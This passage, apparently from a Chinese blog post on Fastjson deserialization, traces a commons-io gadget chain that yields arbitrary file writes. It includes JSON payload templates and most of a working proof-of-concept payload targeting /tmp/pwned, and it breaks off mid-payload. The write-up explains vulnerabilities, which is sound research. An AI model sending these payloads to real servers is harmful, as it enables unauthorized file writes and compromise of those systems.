+		class="gallery-image" 
+		data-flex-grow="556"
+		data-flex-basis="1335px"
+	
+></p>
+<p>接着看doHttpStream的实现，调用了下面的链子到达read方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">XmlStreamReader</span><span class="p">.</span><span class="na">doHttpStream</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BOMInputStream</span><span class="p">.</span><span class="na">getBOMCharsetName</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BOMInputStream</span><span class="p">.</span><span class="na">getBOM</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BufferedInputStream</span><span class="p">.</span><span class="na">read</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BufferedInputStream</span><span class="p">.</span><span class="na">fill</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InputStream</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>BufferedInputStream.fill</code>这里先是调用了getInIfOpen将输入流类型改成InputStream再调用的read方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155046752.png"
+	width="1053"
+	height="656"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155046752_hu5776613070399879549.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155046752_hu12792736638619448136.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003155046752"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="385px"
+	
+></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155143341.png"
+	width="732"
+	height="182"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155143341_hu13805519505512098529.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155143341_hu6563903773432017411.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003155143341"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="402"
+		data-flex-basis="965px"
+	
+></p>
+<p>所以使用XmlStreamReader方法能调用任意InputStream的read方法</p>
+<h4 id="传入字符串作为inputstream">传入字符串作为InputStream
+</h4><p>commons-io包中的ReaderInputStream方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155921235.png"
+	width="1097"
+	height="247"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155921235_hu14788897032536243421.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003155921235_hu11589553691342126016.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003155921235"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="444"
+		data-flex-basis="1065px"
+	
+></p>
+<p>接受一个Reader对象作为参数</p>
+<p>然后看它本身的read方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003160914356.png"
+	width="971"
+	height="811"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003160914356_hu13961659698517797511.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003160914356_hu6269521642479446916.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003160914356"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="287px"
+	
+></p>
+<p>调用了fillBuffer方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003161203010.png"
+	width="1054"
+	height="539"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003161203010_hu6330831452952530436.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003161203010_hu9621163127594147439.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003161203010"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="469px"
+	
+></p>
+<p>然后这里调用了Reader的read方法,如果这里我们传入的是commons-io包的CharSequenceReader类</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003223214358.png"
+	width="1148"
+	height="684"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003223214358_hu9230197990422475908.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003223214358_hu80532398992709841.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003223214358"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="167"
+		data-flex-basis="402px"
+	
+></p>
+<p>它的read方法会循环调用无参的read写到array里面，然后看无参read</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003225057954.png"
+	width="649"
+	height="243"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003225057954_hu6068890703595268508.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251003225057954_hu15829691880885194558.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003225057954"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="267"
+		data-flex-basis="640px"
+	
+></p>
+<p>无参read每次返回charSequence（构造函数传入的参数）一个字符</p>
+<p>所以fillBuffer 方法在这里的主要功能是从 CharSequenceReader 中读取字符并填充到 encoderIn 缓冲区，然后通过 encoder 将字符编码为字节并存储在 encoderOut 缓冲区中。</p>
+<p>输入字符串用ReaderInputStream存储如下，由于ReaderInputStream实际上是创了个Buffer来存储流，构造函数需要传Buffer创建需要的参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;reader&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;org.apache.commons.io.input.CharSequenceReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;charSequence&#34;</span><span class="p">:{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;java.lang.String&#34;&#34;aaaaaa......(YOUR_INPUT)&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;charsetName&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;bufferSize&#34;</span><span class="p">:</span><span class="mi">1024</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="inputstream转outputstream">InputStream转OutputStream
+</h4><p>commons-io包的TeeInputStream类</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004153320167.png"
+	width="1035"
+	height="181"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004153320167_hu3874985952831745846.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004153320167_hu11935201754307294481.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004153320167"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="571"
+		data-flex-basis="1372px"
+	
+></p>
+<p>接收InputStream和OutputStream作为参数</p>
+<p>接着看它的read方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004153415852.png"
+	width="1093"
+	height="240"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004153415852_hu14287873473358850328.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004153415852_hu8303535586056946886.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004153415852"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="455"
+		data-flex-basis="1093px"
+	
+></p>
+<p>read方法调用了OutputStream.write，OutputStream 的 write 方法用于将数据写入输出流。</p>
+<p>至此，我们可以实现XmlStreamReader+TeelInputStream调用write任意InputStream输出到OutputStream</p>
+<p>但是现在只能写字符串，怎么将输出流变文件流呢？</p>
+<h4 id="outputstream-输出到文件">OutputStream 输出到文件
+</h4><p>还是commons-io包里面的WriterOutputStream类</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162058663.png"
+	width="1136"
+	height="235"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162058663_hu11274656835481476683.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162058663_hu8984032031560974424.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004162058663"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="483"
+		data-flex-basis="1160px"
+	
+></p>
+<p>看它的write方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162125688.png"
+	width="1047"
+	height="397"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162125688_hu18361462812171870483.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162125688_hu12675920191405965027.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004162125688"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="632px"
+	
+></p>
+<p>调用了flushOutput方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162845629.png"
+	width="855"
+	height="187"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162845629_hu13532257324289998345.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004162845629_hu6918294874421376586.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004162845629"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="457"
+		data-flex-basis="1097px"
+	
+></p>
+<p>接着调用了Writer.write</p>
+<p>跟前面分析流程一样，这里找到FileWriterWithEncoding类，如果这里的Writer是FileWriterWithEncoding</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004163008486.png"
+	width="700"
+	height="195"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004163008486_hu3199324905072556506.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004163008486_hu11419361592447985113.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004163008486"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="358"
+		data-flex-basis="861px"
+	
+></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004163055762.png"
+	width="1076"
+	height="166"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004163055762_hu18402656715536542810.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004163055762_hu666187774128627801.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004163055762"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="648"
+		data-flex-basis="1555px"
+	
+></p>
+<p>构造函数接收File作为参数，然后这里有个initWriter初始化了一个OutputStreamWriter，封装了FileOutputStream</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004164306799.png"
+	width="1239"
+	height="1066"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004164306799_hu10961474801008127514.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004164306799_hu14364275175354934043.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004164306799"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="278px"
+	
+></p>
+<p>FileWriterWithEncoding.write-&gt;OutputStreamWriter.write-&gt;StreamEncoder.write</p>
+<p>现在我们串一下利用链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">存储char到InputStream</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">XmlStreamReader</span><span class="p">.</span><span class="na">doHttpStream</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BOMInputStream</span><span class="p">.</span><span class="na">getBomCharsetName</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BOMInputStream</span><span class="p">.</span><span class="na">getBom</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BufferedInputStream</span><span class="p">.</span><span class="na">read</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BufferedInputStream</span><span class="p">.</span><span class="na">fill</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ReaderInputStream</span><span class="p">.</span><span class="na">read</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ReaderInputStream</span><span class="p">.</span><span class="na">fillBuffer</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CharSequenceReader</span><span class="p">.</span><span class="na">read读字符串</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">输出InputStream到OutputStream到文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">XmlStreamReader</span><span class="p">.</span><span class="na">doHttpStream</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BOMInputStream</span><span class="p">.</span><span class="na">getBomCharsetName</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BOMInputStream</span><span class="p">.</span><span class="na">getBom</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BufferedInputStream</span><span class="p">.</span><span class="na">read</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">BufferedInputStream</span><span class="p">.</span><span class="na">fill</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TeeInputStream</span><span class="p">.</span><span class="na">read</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">WriterOutputStream</span><span class="p">.</span><span class="na">write</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">WriterOutputStream</span><span class="p">.</span><span class="na">flushOutput</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">FileWriterWithEncoding</span><span class="p">.</span><span class="na">write</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">StreamEncoder</span><span class="p">.</span><span class="na">write</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">StreamEncoder</span><span class="p">.</span><span class="na">implWrite</span><span class="w"> </span><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">StreamEncoder</span><span class="p">.</span><span class="na">writeBytes写文件</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后写文件这里的StreamEncoder.implWrite有个缓存的问题</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171426419.png"
+	width="926"
+	height="740"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171426419_hu4783946458577102161.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171426419_hu4776907285267240828.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004171426419"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="125"
+		data-flex-basis="300px"
+	
+></p>
+<p>这里缓冲区，也就是Underflow要满才能进到writeBytes方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171606192.png"
+	width="757"
+	height="155"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171606192_hu6363012032860823137.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171606192_hu3569947197920193187.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004171606192"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="488"
+		data-flex-basis="1172px"
+	
+></p>
+<p>默认缓冲区大小是8192</p>
+<p>但是传入的BufferedInputStream一块只有4096</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171826205.png"
+	width="675"
+	height="86"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171826205_hu14218368934676894183.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251004171826205_hu2890962105732081144.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251004171826205"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="784"
+		data-flex-basis="1883px"
+	
+></p>
+<p>利用$ref可以多次调用StreamEncoder.implWrite向同一个缓冲区写入流数据，直到overflow写文件</p>
+<h4 id="poc-7">poc
+</h4><p>commons-io在2.0-2.6和2.7-2.8版本之间各文件的构造函数参数名有些许不同</p>
+<p>2.0-2.6版本POC：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;x&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.alibaba.fastjson.JSONObject&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;reader&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.CharSequenceReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;charSequence&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.String&#34;&#34;aaaaaa...(长度要大于8192，实际写入前8192个字符)&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;charsetName&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;bufferSize&#34;</span><span class="p">:</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.output.WriterOutputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;writer&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.output.FileWriterWithEncoding&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;file&#34;</span><span class="p">:</span> <span class="s2">&#34;/tmp/pwned&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;append&#34;</span><span class="p">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;charsetName&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;bufferSize&#34;</span><span class="p">:</span> <span class="mi">1024</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;writeImmediately&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;trigger&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;is&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.input&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.branch&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;closeBranch&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;httpContentType&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;lenient&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;defaultEncoding&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span>
